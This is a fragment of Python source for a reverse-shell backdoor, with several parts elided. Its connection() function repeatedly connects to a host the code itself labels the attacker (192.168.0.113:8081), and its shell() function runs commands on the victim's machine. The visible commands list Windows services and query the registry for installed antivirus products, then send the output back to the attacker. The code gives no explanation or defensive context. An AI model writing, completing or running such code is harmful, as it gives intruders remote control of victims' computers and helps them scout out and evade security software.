...
def connection():
    while True:
        time.sleep(5)
        try:
            connection_to_attacker.connect(("192.168.0.113", 8081))
            shell()
...
def shell():
    while True:
        ...
        if command == 'terminate':
            ...
            try:
                execute = subprocess.run("wmic service list brief", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                result = execute.stdout.decode()+ execute.stderr.decode()
                #result = result.decode()
                reliable_send(result)
            ...
            try:
                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
